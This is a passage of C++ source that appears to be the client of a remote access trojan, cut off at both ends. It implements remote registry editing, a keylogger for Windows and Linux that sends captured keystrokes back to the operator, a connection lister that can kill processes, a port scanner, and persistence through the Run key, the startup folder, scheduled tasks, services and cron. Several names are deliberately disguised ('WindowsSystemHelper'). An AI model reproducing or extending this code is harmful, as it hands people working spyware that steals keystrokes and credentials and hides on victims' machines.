                    case REG_MULTI_SZ: response += "REG_MULTI_SZ"; break;
                    case REG_EXPAND_SZ: response += "REG_EXPAND_SZ"; break;
                    default: response += "REG_UNKNOWN"; break;
                    }
                    response += "\",\"data\":\"";

                    // Add data based on type
                    switch (type) {
                    case REG_SZ:
                    case REG_EXPAND_SZ:
                        response += escapeJsonString(std::string((char*)buffer.data()));
                        break;

                    case REG_DWORD:
                        response += std::to_string(*(DWORD*)buffer.data());
                        break;

                    case REG_BINARY:
                        // Convert binary to hex string
                        for (DWORD i = 0; i < size; i++) {
                            char hex[3];
                            sprintf(hex, "%02X", buffer[i]);
                            response += hex;
                            if (i < size - 1) response += " ";
                        }
                        break;

                    case REG_MULTI_SZ:
                        // Multi-string, separated by null chars
                    {
                        char* p = (char*)buffer.data();
                        while (*p) {
                            response += escapeJsonString(p) + "\\n";
                            p += strlen(p) + 1;
                        }
                    }
                    break;
                    }

                    response += "\"}\n";
                    sendMessage(response);
                }
                else {
                    sendRegistryError("Failed to read value data");
                }
            }
            else {
                sendRegistryError("Value not found");
            }

            RegCloseKey(hKey);
        }
        else {
            sendRegistryError("Failed to open registry key");
        }
#else
        sendRegistryError("Registry operations not supported on Linux");
#endif
    }

    void handleRegistryWrite(const std::string& message) {
#ifdef _WIN32
        // Extract parameters
        size_t hive_start = message.find("\"hive\":\"");
        size_t key_start = message.find("\"key\":\"");
        size_t value_start = message.find("\"value\":\"");
        size_t type_start = message.find("\"value_type\":\"");
        size_t data_start = message.find("\"data\":\"");

        if (hive_start == std::string::npos || key_start == std::string::npos ||
            type_start == std::string::npos || data_start == std::string::npos) {
            sendRegistryError("Missing required parameters");
            return;
        }

        // Parse parameters
        hive_start += 8;
        size_t hive_end = message.find("\"", hive_start);
        std::string hive_str = message.substr(hive_start, hive_end - hive_start);

        key_start += 7;
        size_t key_end = message.find("\"", key_start);
        std::string key_path = message.substr(key_start, key_end - key_start);
        key_path = unescapeJsonString(key_path);

        std::string value_name = "";
        if (value_start != std::string::npos) {
            value_start += 9;
            size_t value_end = message.find("\"", value_start);
            value_name = message.substr(value_start, value_end - value_start);
            value_name = unescapeJsonString(value_name);
        }

        type_start += 14;
        size_t type_end = message.find("\"", type_start);
        std::string type_str = message.substr(type_start, type_end - type_start);

        data_start += 8;
        size_t data_end = message.find("\"", data_start);
        std::string data_str = message.substr(data_start, data_end - data_start);
        data_str = unescapeJsonString(data_str);

        HKEY hive = parseRegistryHive(hive_str);
        if (!hive) {
            sendRegistryError("Invalid hive");
            return;
        }

        HKEY hKey;
        DWORD disposition;

        // Create or open key
        if (RegCreateKeyExA(hive, key_path.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE,
            KEY_WRITE, NULL, &hKey, &disposition) == ERROR_SUCCESS) {

            LONG result = ERROR_SUCCESS;

            if (type_str == "REG_SZ") {
                result = RegSetValueExA(hKey, value_name.c_str(), 0, REG_SZ,
                    (BYTE*)data_str.c_str(), data_str.length() + 1);
            }
            else if (type_str == "REG_DWORD") {
                DWORD value = std::stoul(data_str);
                result = RegSetValueExA(hKey, value_name.c_str(), 0, REG_DWORD,
                    (BYTE*)&value, sizeof(DWORD));
            }
            else if (type_str == "REG_BINARY") {
                // Parse hex string to binary
                std::vector<BYTE> binary;
                std::istringstream hex_stream(data_str);
                std::string hex_byte;

                while (hex_stream >> hex_byte) {
                    binary.push_back((BYTE)std::stoul(hex_byte, nullptr, 16));
                }

                result = RegSetValueExA(hKey, value_name.c_str(), 0, REG_BINARY,
                    binary.data(), binary.size());
            }

            RegCloseKey(hKey);

            std::string response = "{\"type\":\"registry_write_result\",\"success\":" +
                std::string(result == ERROR_SUCCESS ? "true" : "false") + "}\n";
            sendMessage(response);
        }
        else {
            sendRegistryError("Failed to create/open registry key");
        }
#else
        sendRegistryError("Registry operations not supported on Linux");
#endif
    }

    void handleRegistryDelete(const std::string& message) {
#ifdef _WIN32
        size_t hive_start = message.find("\"hive\":\"");
        size_t key_start = message.find("\"key\":\"");
        size_t value_start = message.find("\"value\":\"");

        if (hive_start == std::string::npos || key_start == std::string::npos) {
            sendRegistryError("Missing hive or key");
            return;
        }

        hive_start += 8;
        size_t hive_end = message.find("\"", hive_start);
        std::string hive_str = message.substr(hive_start, hive_end - hive_start);

        key_start += 7;
        size_t key_end = message.find("\"", key_start);
        std::string key_path = message.substr(key_start, key_end - key_start);
        key_path = unescapeJsonString(key_path);

        HKEY hive = parseRegistryHive(hive_str);
        if (!hive) {
            sendRegistryError("Invalid hive");
            return;
        }

        LONG result;

        if (value_start != std::string::npos) {
            // Delete a value
            value_start += 9;
            size_t value_end = message.find("\"", value_start);
            std::string value_name = message.substr(value_start, value_end - value_start);
            value_name = unescapeJsonString(value_name);

            HKEY hKey;
            if (RegOpenKeyExA(hive, key_path.c_str(), 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
                result = RegDeleteValueA(hKey, value_name.c_str());
                RegCloseKey(hKey);
            }
            else {
                result = ERROR_FILE_NOT_FOUND;
            }
        }
        else {
            // Delete entire key
            result = RegDeleteKeyA(hive, key_path.c_str());
        }

        std::string response = "{\"type\":\"registry_delete_result\",\"success\":" +
            std::string(result == ERROR_SUCCESS ? "true" : "false") + "}\n";
        sendMessage(response);
#else
        sendRegistryError("Registry operations not supported on Linux");
#endif
    }

    void handleRegistryEnumKeys(const std::string& message) {
#ifdef _WIN32
        size_t hive_start = message.find("\"hive\":\"");
        size_t key_start = message.find("\"key\":\"");

        if (hive_start == std::string::npos || key_start == std::string::npos) {
            sendRegistryError("Missing hive or key");
            return;
        }

        hive_start += 8;
        size_t hive_end = message.find("\"", hive_start);
        std::string hive_str = message.substr(hive_start, hive_end - hive_start);

        key_start += 7;
        size_t key_end = message.find("\"", key_start);
        std::string key_path = message.substr(key_start, key_end - key_start);
        key_path = unescapeJsonString(key_path);

        HKEY hive = parseRegistryHive(hive_str);
        if (!hive) {
            sendRegistryError("Invalid hive");
            return;
        }

        HKEY hKey;
        if (RegOpenKeyExA(hive, key_path.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            std::string response = "{\"type\":\"registry_keys_list\",\"keys\":[";

            DWORD index = 0;
            char keyName[256];
            DWORD keyNameSize = sizeof(keyName);
            bool first = true;

            while (RegEnumKeyExA(hKey, index, keyName, &keyNameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
                if (!first) response += ",";
                first = false;

                response += "\"" + escapeJsonString(keyName) + "\"";

                index++;
                keyNameSize = sizeof(keyName);
            }

            RegCloseKey(hKey);
            response += "]}\n";
            sendMessage(response);
        }
        else {
            sendRegistryError("Failed to open registry key");
        }
#else
        sendRegistryError("Registry operations not supported on Linux");
#endif
    }

    void handleRegistryEnumValues(const std::string& message) {
#ifdef _WIN32
        size_t hive_start = message.find("\"hive\":\"");
        size_t key_start = message.find("\"key\":\"");

        if (hive_start == std::string::npos || key_start == std::string::npos) {
            sendRegistryError("Missing hive or key");
            return;
        }

        hive_start += 8;
        size_t hive_end = message.find("\"", hive_start);
        std::string hive_str = message.substr(hive_start, hive_end - hive_start);

        key_start += 7;
        size_t key_end = message.find("\"", key_start);
        std::string key_path = message.substr(key_start, key_end - key_start);
        key_path = unescapeJsonString(key_path);

        HKEY hive = parseRegistryHive(hive_str);
        if (!hive) {
            sendRegistryError("Invalid hive");
            return;
        }

        HKEY hKey;
        if (RegOpenKeyExA(hive, key_path.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            std::string response = "{\"type\":\"registry_values_list\",\"values\":[";

            DWORD index = 0;
            char valueName[256];
            DWORD valueNameSize = sizeof(valueName);
            DWORD type;
            bool first = true;

            while (RegEnumValueA(hKey, index, valueName, &valueNameSize, NULL, &type, NULL, NULL) == ERROR_SUCCESS) {
                if (!first) response += ",";
                first = false;

                response += "{\"name\":\"" + escapeJsonString(valueName) + "\",\"type\":\"";

                switch (type) {
                case REG_SZ: response += "REG_SZ"; break;
                case REG_DWORD: response += "REG_DWORD"; break;
                case REG_BINARY: response += "REG_BINARY"; break;
                case REG_MULTI_SZ: response += "REG_MULTI_SZ"; break;
                case REG_EXPAND_SZ: response += "REG_EXPAND_SZ"; break;
                default: response += "REG_UNKNOWN"; break;
                }

                response += "\"}";

                index++;
                valueNameSize = sizeof(valueName);
            }

            RegCloseKey(hKey);
            response += "]}\n";
            sendMessage(response);
        }
        else {
            sendRegistryError("Failed to open registry key");
        }
#else
        sendRegistryError("Registry operations not supported on Linux");
#endif
    }

    void sendRegistryError(const std::string& error) {
        std::string response = "{\"type\":\"registry_error\",\"error\":\"" +
            escapeJsonString(error) + "\"}\n";
        sendMessage(response);
    }

    void handleStartKeylogger() {
        if (keylog_active) {
            sendMessage("{\"type\":\"keylogger_status\",\"active\":true,\"message\":\"Already running\"}\n");
            return;
        }

        keylog_active = true;

#ifdef _WIN32
        keylog_instance = this;  // Set static instance for callback

        keylog_thread = std::thread([this]() {
            // Install low-level keyboard hook
            keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);

            if (keyboard_hook) {
                MSG msg;
                // Message loop required for hooks
                while (keylog_active && GetMessage(&msg, NULL, 0, 0)) {
                    TranslateMessage(&msg);
                    DispatchMessage(&msg);
                }

                UnhookWindowsHookEx(keyboard_hook);
                keyboard_hook = NULL;
            }
            });
#else
        // Linux keylogger using /dev/input/eventX
        keylog_thread = std::thread([this]() {
            FILE* kbd = nullptr;

            // Try to find keyboard device
            for (int i = 0; i < 10; i++) {
                std::string device = "/dev/input/event" + std::to_string(i);
                kbd = fopen(device.c_str(), "rb");
                if (kbd) break;
            }

            if (!kbd) {
                // Fallback: try xinput
                while (keylog_active) {
                    FILE* pipe = popen("xinput test-xi2 --root 2>/dev/null | grep -A2 'RawKeyPress'", "r");
                    if (pipe) {
                        char buffer[256];
                        while (fgets(buffer, sizeof(buffer), pipe) && keylog_active) {
                            std::string line(buffer);
                            if (line.find("detail:") != std::string::npos) {
                                // Extract keycode and convert
                                processLinuxKeycode(line);
                            }
                        }
                        pclose(pipe);
                    }
                    std::this_thread::sleep_for(std::chrono::milliseconds(100));
                }
            }
            else {
                // Read from /dev/input/eventX
                struct input_event ev;
                while (keylog_active && fread(&ev, sizeof(ev), 1, kbd) == 1) {
                    if (ev.type == EV_KEY && ev.value == 1) { // Key press
                        processLinuxKey(ev.code);
                    }
                }
                fclose(kbd);
            }
            });
#endif

        sendMessage("{\"type\":\"keylogger_status\",\"active\":true,\"message\":\"Keylogger started\"}\n");
    }

    void handleStopKeylogger() {
        keylog_active = false;

#ifdef _WIN32
        if (keyboard_hook) {
            PostThreadMessage(GetThreadId(keylog_thread.native_handle()), WM_QUIT, 0, 0);
        }
#endif

        if (keylog_thread.joinable()) {
            keylog_thread.join();
        }

        sendMessage("{\"type\":\"keylogger_status\",\"active\":false,\"message\":\"Keylogger stopped\"}\n");
    }

    void handleGetKeylog() {
        std::lock_guard<std::mutex> lock(keylog_mutex);

        std::string response = "{\"type\":\"keylog_data\",\"data\":\"" +
            escapeJsonString(keylog_buffer) +
            "\",\"size\":" + std::to_string(keylog_buffer.length()) + "}\n";
        sendMessage(response);
    }

    void handleClearKeylog() {
        std::lock_guard<std::mutex> lock(keylog_mutex);
        keylog_buffer.clear();

        sendMessage("{\"type\":\"keylog_clear\",\"success\":true}\n");
    }

#ifdef _WIN32
    static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
        if (nCode >= 0 && keylog_instance && keylog_instance->keylog_active) {
            if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
                KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
                keylog_instance->processWindowsKey(kbStruct->vkCode);
            }
        }
        return CallNextHookEx(keyboard_hook, nCode, wParam, lParam);
    }

    void processWindowsKey(DWORD vkCode) {
        std::lock_guard<std::mutex> lock(keylog_mutex);

        std::string key;

        // Check for special keys
        switch (vkCode) {
        case VK_RETURN: key = "[ENTER]"; break;
        case VK_SPACE: key = " "; break;
        case VK_TAB: key = "[TAB]"; break;
        case VK_BACK: key = "[BACKSPACE]"; break;
        case VK_ESCAPE: key = "[ESC]"; break;
        case VK_DELETE: key = "[DEL]"; break;
        case VK_CONTROL: key = "[CTRL]"; break;
        case VK_MENU: key = "[ALT]"; break;
        case VK_SHIFT: key = "[SHIFT]"; break;
        case VK_CAPITAL: key = "[CAPS]"; break;
        case VK_UP: key = "[UP]"; break;
        case VK_DOWN: key = "[DOWN]"; break;
        case VK_LEFT: key = "[LEFT]"; break;
        case VK_RIGHT: key = "[RIGHT]"; break;
        case VK_F1: case VK_F2: case VK_F3: case VK_F4:
        case VK_F5: case VK_F6: case VK_F7: case VK_F8:
        case VK_F9: case VK_F10: case VK_F11: case VK_F12:
            key = "[F" + std::to_string(vkCode - VK_F1 + 1) + "]";
            break;
        default:
            // Regular keys
            if ((vkCode >= 0x30 && vkCode <= 0x39) || // 0-9
                (vkCode >= 0x41 && vkCode <= 0x5A)) { // A-Z

                // Get key state
                BYTE keyState[256];
                GetKeyboardState(keyState);

                WCHAR buffer[2];
                int result = ToUnicode(vkCode, MapVirtualKey(vkCode, MAPVK_VK_TO_VSC),
                    keyState, buffer, 2, 0);

                if (result > 0) {
                    // Convert wide char to narrow
                    char narrowBuffer[3] = { 0 };
                    WideCharToMultiByte(CP_UTF8, 0, buffer, result, narrowBuffer, 3, NULL, NULL);
                    key = narrowBuffer;
                }
            }
            else if (vkCode >= 0x60 && vkCode <= 0x69) { // Numpad 0-9
                key = std::to_string(vkCode - 0x60);
            }
            else {
                // Other keys
                switch (vkCode) {
                case VK_OEM_PERIOD: key = "."; break;
                case VK_OEM_COMMA: key = ","; break;
                case VK_OEM_MINUS: key = "-"; break;
                case VK_OEM_PLUS: key = "="; break;
                case VK_OEM_1: key = ";"; break;
                case VK_OEM_2: key = "/"; break;
                case VK_OEM_3: key = "`"; break;
                case VK_OEM_4: key = "["; break;
                case VK_OEM_5: key = "\\"; break;
                case VK_OEM_6: key = "]"; break;
                case VK_OEM_7: key = "'"; break;
                }
            }
        }

        if (!key.empty()) {
            keylog_buffer += key;

            // Send update every 100 characters or on Enter
            if (keylog_buffer.length() >= 100 || key == "[ENTER]") {
                sendKeylogUpdate();
            }
        }
    }
#endif

#ifndef _WIN32
    void processLinuxKey(int code) {
        std::lock_guard<std::mutex> lock(keylog_mutex);

        std::string key;

        // Linux keycodes mapping (simplified)
        switch (code) {
        case 1: key = "[ESC]"; break;
        case 14: key = "[BACKSPACE]"; break;
        case 15: key = "[TAB]"; break;
        case 28: key = "[ENTER]"; break;
        case 29: key = "[CTRL]"; break;
        case 42: case 54: key = "[SHIFT]"; break;
        case 56: key = "[ALT]"; break;
        case 57: key = " "; break;
        case 58: key = "[CAPS]"; break;
            // Numbers
        case 2: key = "1"; break;
        case 3: key = "2"; break;
        case 4: key = "3"; break;
        case 5: key = "4"; break;
        case 6: key = "5"; break;
        case 7: key = "6"; break;
        case 8: key = "7"; break;
        case 9: key = "8"; break;
        case 10: key = "9"; break;
        case 11: key = "0"; break;
            // Letters
        case 16: key = "q"; break;
        case 17: key = "w"; break;
        case 18: key = "e"; break;
        case 19: key = "r"; break;
        case 20: key = "t"; break;
        case 21: key = "y"; break;
        case 22: key = "u"; break;
        case 23: key = "i"; break;
        case 24: key = "o"; break;
        case 25: key = "p"; break;
        case 30: key = "a"; break;
        case 31: key = "s"; break;
        case 32: key = "d"; break;
        case 33: key = "f"; break;
        case 34: key = "g"; break;
        case 35: key = "h"; break;
        case 36: key = "j"; break;
        case 37: key = "k"; break;
        case 38: key = "l"; break;
        case 44: key = "z"; break;
        case 45: key = "x"; break;
        case 46: key = "c"; break;
        case 47: key = "v"; break;
        case 48: key = "b"; break;
        case 49: key = "n"; break;
        case 50: key = "m"; break;
            // Add more mappings as needed
        }

        if (!key.empty()) {
            keylog_buffer += key;

            if (keylog_buffer.length() >= 100 || key == "[ENTER]") {
                sendKeylogUpdate();
            }
        }
    }

    void processLinuxKeycode(const std::string& line) {
        // Parse xinput output for keycode
        size_t pos = line.find("detail:");
        if (pos != std::string::npos) {
            int keycode = std::stoi(line.substr(pos + 8));
            processLinuxKey(keycode - 8); // X11 keycodes are offset by 8
        }
    }
#endif

    void sendKeylogUpdate() {
        std::string response = "{\"type\":\"keylog_update\",\"data\":\"" +
            escapeJsonString(keylog_buffer) +
            "\",\"timestamp\":" + std::to_string(time(nullptr)) + "}\n";
        sendMessage(response);
    }

    void handleGetConnections() {
#ifdef _WIN32
        std::string json_response = "{\"type\":\"connections_list\",\"connections\":[";
        bool first = true;

        DWORD dwSize = 0;
        GetExtendedTcpTable(NULL, &dwSize, TRUE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0);
        std::vector<BYTE> buffer(dwSize);
        PMIB_TCPTABLE_OWNER_PID pTcpTable = (PMIB_TCPTABLE_OWNER_PID)buffer.data();

        if (GetExtendedTcpTable(pTcpTable, &dwSize, TRUE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0) == NO_ERROR) {
            for (DWORD i = 0; i < pTcpTable->dwNumEntries; i++) {
                if (!first) {
                    json_response += ",";
                }
                first = false;

                json_response += "{";
                json_response += "\"protocol\":\"TCP\",";

                char localAddr[INET_ADDRSTRLEN];
                inet_ntop(AF_INET, &(pTcpTable->table[i].dwLocalAddr), localAddr, INET_ADDRSTRLEN);
                json_response += "\"local_addr\":\"" + std::string(localAddr) + "\",";
                json_response += "\"local_port\":" + std::to_string(ntohs((u_short)pTcpTable->table[i].dwLocalPort)) + ",";

                char remoteAddr[INET_ADDRSTRLEN];
                inet_ntop(AF_INET, &(pTcpTable->table[i].dwRemoteAddr), remoteAddr, INET_ADDRSTRLEN);
                json_response += "\"remote_addr\":\"" + std::string(remoteAddr) + "\",";
                json_response += "\"remote_port\":" + std::to_string(ntohs((u_short)pTcpTable->table[i].dwRemotePort)) + ",";

                std::string state;
                switch (pTcpTable->table[i].dwState) {
                case MIB_TCP_STATE_CLOSED: state = "CLOSED"; break;
                case MIB_TCP_STATE_LISTEN: state = "LISTEN"; break;
                case MIB_TCP_STATE_SYN_SENT: state = "SYN_SENT"; break;
                case MIB_TCP_STATE_SYN_RCVD: state = "SYN_RCVD"; break;
                case MIB_TCP_STATE_ESTAB: state = "ESTABLISHED"; break;
                case MIB_TCP_STATE_FIN_WAIT1: state = "FIN_WAIT1"; break;
                case MIB_TCP_STATE_FIN_WAIT2: state = "FIN_WAIT2"; break;
                case MIB_TCP_STATE_CLOSE_WAIT: state = "CLOSE_WAIT"; break;
                case MIB_TCP_STATE_CLOSING: state = "CLOSING"; break;
                case MIB_TCP_STATE_LAST_ACK: state = "LAST_ACK"; break;
                case MIB_TCP_STATE_TIME_WAIT: state = "TIME_WAIT"; break;
                case MIB_TCP_STATE_DELETE_TCB: state = "DELETE_TCB"; break;
                default: state = "UNKNOWN"; break;
                }
                json_response += "\"state\":\"" + state + "\",";
                json_response += "\"pid\":" + std::to_string(pTcpTable->table[i].dwOwningPid) + ",";

                // Get process name from PID
                std::string processName = "N/A";
                HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pTcpTable->table[i].dwOwningPid);
                if (hProcess != NULL) {
                    char processPath[MAX_PATH];
                    if (GetModuleFileNameExA(hProcess, NULL, processPath, MAX_PATH)) {
                        processName = fs::path(processPath).filename().string();
                    }
                    CloseHandle(hProcess);
                }
                json_response += "\"process\":\"" + escapeJsonString(processName) + "\"";

                json_response += "}";
            }
        }

        json_response += "]}\n";
        sendMessage(json_response);
#else
        // Implement for Linux if needed
        sendMessage("{\"type\":\"connections_list\",\"connections\":[]}\n");
#endif
    }

    void handleCloseConnection(const std::string& message) {
#ifdef _WIN32
        // Extract connection details
        size_t pid_start = message.find("\"pid\":");
        size_t local_port_start = message.find("\"local_port\":");
        size_t remote_port_start = message.find("\"remote_port\":");

        if (pid_start == std::string::npos) return;

        pid_start += 6;
        size_t pid_end = message.find_first_of(",}", pid_start);
        int pid = std::stoi(message.substr(pid_start, pid_end - pid_start));

        bool success = false;
        // On Windows, we can terminate the process owning the connection
        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
        if (hProcess) {
            if (TerminateProcess(hProcess, 1)) {
                success = true;
            }
            CloseHandle(hProcess);
        }

        std::string result_msg = "{\"type\":\"connection_close_result\",\"success\":" + std::string(success ? "true" : "false") + "}\n";
        sendMessage(result_msg);
#else
        // Not implemented for Linux
#endif
    }

    void handleStartNetstatMonitor() {
        if (netstat_monitor_active) return;

        netstat_monitor_active = true;

        netstat_monitor_thread = std::thread([this]() {
            while (netstat_monitor_active && connected) {
                // Get current connections
                handleGetConnections();

                // Wait 5 seconds before next update
                std::this_thread::sleep_for(std::chrono::seconds(5));
            }
            });

        sendMessage("{\"type\":\"netstat_monitor_status\",\"active\":true}\n");
    }

    void handleStopNetstatMonitor() {
        netstat_monitor_active = false;

        if (netstat_monitor_thread.joinable()) {
            netstat_monitor_thread.join();
        }

        sendMessage("{\"type\":\"netstat_monitor_status\",\"active\":false}\n");
    }

    void handlePortScan(const std::string& message) {
        // Extract target IP and port range
        size_t target_start = message.find("\"target\":\"");
        size_t start_port_start = message.find("\"start_port\":");
        size_t end_port_start = message.find("\"end_port\":");

        if (target_start == std::string::npos || start_port_start == std::string::npos) return;

        target_start += 10;
        size_t target_end = message.find("\"", target_start);
        std::string target = message.substr(target_start, target_end - target_start);

        start_port_start += 13;
        size_t start_port_end = message.find_first_of(",}", start_port_start);
        int start_port = std::stoi(message.substr(start_port_start, start_port_end - start_port_start));

        int end_port = start_port + 100; // Default range
        if (end_port_start != std::string::npos) {
            end_port_start += 11;
            size_t end_port_end = message.find_first_of(",}", end_port_start);
            end_port = std::stoi(message.substr(end_port_start, end_port_end - end_port_start));
        }

        // Stop any existing scan
        port_scan_active = false;
        if (port_scan_thread.joinable()) {
            port_scan_thread.join();
        }

        port_scan_active = true;

        port_scan_thread = std::thread([this, target, start_port, end_port]() {
            std::string scan_id = std::to_string(time(nullptr));

            // Send scan started
            sendMessage("{\"type\":\"port_scan_started\",\"scan_id\":\"" + scan_id +
                "\",\"target\":\"" + target + "\",\"range\":\"" +
                std::to_string(start_port) + "-" + std::to_string(end_port) + "\"}\n");

            // Common ports to check first for quick results
            std::vector<int> common_ports = { 21, 22, 23, 25, 80, 110, 443, 445, 3306, 3389, 8080 };
            std::vector<std::pair<int, std::string>> open_ports;

            // Scan common ports first
            for (int port : common_ports) {
                if (!port_scan_active) break;
                if (port >= start_port && port <= end_port) {
                    if (checkPort(target, port)) {
                        std::string service = getServiceName(port);
                        open_ports.push_back({ port, service });

                        // Send real-time update
                        sendPortUpdate(scan_id, target, port, true, service);
                    }
                }
            }

            // Scan remaining range
            for (int port = start_port; port <= end_port && port_scan_active; port++) {
                // Skip if already scanned
                if (std::find(common_ports.begin(), common_ports.end(), port) != common_ports.end()) {
                    continue;
                }

                if (checkPort(target, port)) {
                    std::string service = getServiceName(port);
                    open_ports.push_back({ port, service });

                    // Send real-time update
                    sendPortUpdate(scan_id, target, port, true, service);
                }

                // Progress update every 10 ports
                if (port % 10 == 0) {
                    int progress = ((port - start_port) * 100) / (end_port - start_port);
                    sendMessage("{\"type\":\"port_scan_progress\",\"scan_id\":\"" + scan_id +
                        "\",\"progress\":" + std::to_string(progress) + "}\n");
                }
            }

            // Send final results
            std::string results_json = "{\"type\":\"port_scan_complete\",\"scan_id\":\"" + scan_id +
                "\",\"target\":\"" + target + "\",\"open_ports\":[";

            bool first = true;
            for (const auto& port_info : open_ports) {
                if (!first) results_json += ",";
                first = false;

                results_json += "{\"port\":" + std::to_string(port_info.first) +
                    ",\"service\":\"" + port_info.second + "\"}";
            }

            results_json += "],\"total_scanned\":" + std::to_string(end_port - start_port + 1) +
                ",\"total_open\":" + std::to_string(open_ports.size()) + "}\n";

            sendMessage(results_json);

            port_scan_active = false;
            });
    }

    bool checkPort(const std::string& host, int port) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) return false;

        // Set non-blocking mode for timeout
#ifdef _WIN32
        u_long mode = 1;
        ioctlsocket(sock, FIONBIO, &mode);
#else
        int flags = fcntl(sock, F_GETFL, 0);
        fcntl(sock, F_SETFL, flags | O_NONBLOCK);
#endif

        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);

        if (inet_pton(AF_INET, host.c_str(), &addr.sin_addr) <= 0) {
            CLOSE_SOCKET(sock);
            return false;
        }

        connect(sock, (struct sockaddr*)&addr, sizeof(addr));

        // Wait for connection with timeout
        fd_set fdset;
        FD_ZERO(&fdset);
        FD_SET(sock, &fdset);

        struct timeval tv;
        tv.tv_sec = 1;  // 1 second timeout
        tv.tv_usec = 0;

        bool is_open = false;
        if (select(sock + 1, NULL, &fdset, NULL, &tv) > 0) {
            int error = 0;
            socklen_t len = sizeof(error);
            if (getsockopt(sock, SOL_SOCKET, SO_ERROR, (char*)&error, &len) == 0) {
                is_open = (error == 0);
            }
        }

        CLOSE_SOCKET(sock);
        return is_open;
    }

    std::string getServiceName(int port) {
        // Common port to service mapping
        static std::map<int, std::string> services = {
            {21, "FTP"}, {22, "SSH"}, {23, "Telnet"}, {25, "SMTP"},
            {53, "DNS"}, {80, "HTTP"}, {110, "POP3"}, {143, "IMAP"},
            {443, "HTTPS"}, {445, "SMB"}, {1433, "MSSQL"}, {3306, "MySQL"},
            {3389, "RDP"}, {5432, "PostgreSQL"}, {5900, "VNC"}, {8080, "HTTP-Proxy"},
            {8443, "HTTPS-Alt"}, {27017, "MongoDB"}
        };

        auto it = services.find(port);
        if (it != services.end()) {
            return it->second;
        }
        return "Unknown";
    }

    void sendPortUpdate(const std::string& scan_id, const std::string& target,
        int port, bool is_open, const std::string& service) {
        std::string update = "{\"type\":\"port_found\",\"scan_id\":\"" + scan_id +
            "\",\"target\":\"" + target + "\",\"port\":" + std::to_string(port) +
            ",\"open\":" + (is_open ? "true" : "false") +
            ",\"service\":\"" + service + "\"}\n";
        sendMessage(update);
    }

    void handleStopPortScan() {
        port_scan_active = false;

        if (port_scan_thread.joinable()) {
            port_scan_thread.join();
        }

        sendMessage("{\"type\":\"port_scan_stopped\",\"success\":true}\n");
    }


    void handleInstallPersistence(const std::string& message) {
        // Extract persistence method
        size_t method_start = message.find("\"method\":\"");
        std::string method = "registry"; // default

        if (method_start != std::string::npos) {
            method_start += 10;
            size_t method_end = message.find("\"", method_start);
            method = message.substr(method_start, method_end - method_start);
        }

        bool success = false;
        std::string error_msg;

#ifdef _WIN32
        // Get current executable path
        char exePath[MAX_PATH];
        if (GetModuleFileNameA(NULL, exePath, MAX_PATH) == 0) {
            error_msg = "Failed to get executable path";
            sendPersistenceResult("install", false, error_msg);
            return;
        }

        if (method == "registry") {
            // Add to registry startup
            HKEY hKey;
            if (RegOpenKeyExA(HKEY_CURRENT_USER,
                "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {

                // Use a less suspicious name
                std::string valueName = "WindowsSystemHelper";

                if (RegSetValueExA(hKey, valueName.c_str(), 0, REG_SZ,
                    (BYTE*)exePath, strlen(exePath) + 1) == ERROR_SUCCESS) {
                    success = true;
                }
                else {
                    error_msg = "Failed to set registry value";
                }
                RegCloseKey(hKey);
            }
            else {
                error_msg = "Failed to open registry key";
            }
        }
        else if (method == "startup_folder") {
            // Copy to startup folder
            char startupPath[MAX_PATH];
            if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath))) {
                std::string destPath = std::string(startupPath) + "\\SystemHelper.exe";

                if (CopyFileA(exePath, destPath.c_str(), FALSE)) {
                    success = true;
                }
                else {
                    error_msg = "Failed to copy to startup folder";
                }
            }
            else {
                error_msg = "Failed to get startup folder path";
            }
        }
        else if (method == "scheduled_task") {
            // Create scheduled task using schtasks command
            std::string taskName = "SystemMaintenanceTask";
            std::string cmd = "schtasks /create /tn \"" + taskName +
                "\" /tr \"" + std::string(exePath) +
                "\" /sc onlogon /rl highest /f";

            FILE* pipe = _popen(cmd.c_str(), "r");
            if (pipe) {
                char buffer[256];
                std::string output;
                while (fgets(buffer, sizeof(buffer), pipe)) {
                    output += buffer;
                }
                int result = _pclose(pipe);

                if (result == 0) {
                    success = true;
                }
                else {
                    error_msg = "Failed to create scheduled task: " + output;
                }
            }
            else {
                error_msg = "Failed to execute schtasks command";
            }
        }
        else if (method == "service") {
            // Install as service (requires admin rights)
            SC_HANDLE scManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
            if (scManager) {
                SC_HANDLE service = CreateServiceA(
                    scManager,
                    "SystemHelperService",
                    "System Helper Service",
                    SERVICE_ALL_ACCESS,
                    SERVICE_WIN32_OWN_PROCESS,
                    SERVICE_AUTO_START,
                    SERVICE_ERROR_NORMAL,
                    exePath,
                    NULL, NULL, NULL, NULL, NULL
                );

                if (service) {
                    success = true;
                    CloseServiceHandle(service);
                }
                else {
                    error_msg = "Failed to create service";
                }
                CloseServiceHandle(scManager);
            }
            else {
                error_msg = "Failed to open service manager (admin rights required)";
            }
        }
#else
        // Linux persistence methods
        char exePath[PATH_MAX];
        ssize_t len = readlink("/proc/self/exe", exePath, sizeof(exePath) - 1);
        if (len == -1) {
            error_msg = "Failed to get executable path";
            sendPersistenceResult("install", false, error_msg);
            return;
        }
        exePath[len] = '\0';

        if (method == "cron") {
            // Add to user crontab
            std::string cronEntry = "@reboot " + std::string(exePath) + " > /dev/null 2>&1";
